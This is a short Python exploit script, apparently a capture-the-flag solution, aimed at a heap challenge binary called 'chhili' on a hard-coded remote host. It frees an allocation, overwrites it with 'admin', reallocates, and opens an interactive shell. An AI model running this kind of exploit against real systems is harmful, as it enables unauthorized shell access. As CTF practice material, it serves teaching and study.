#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./chhili')

host = args.HOST or '40.71.72.198'
port = int(args.PORT or 1234)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *get_shell
continue
'''.format(**locals())

# -- Exploit goes here --

def add(size, data):
    sla(">> ", "1")
    sla(">> ", str(size))
    sa(">> ", data)

def delete():
    sla(">> ", "2")

def edit(data):
    sla(">> ", "3")
    sa(">> ", data)


io = start()
add(0x16, "B"*8 + "C"*8)
delete()
edit('admin')
add(0x31, "B"*8 + "C"*8)
sla(">> ", "4")
io.interactive()

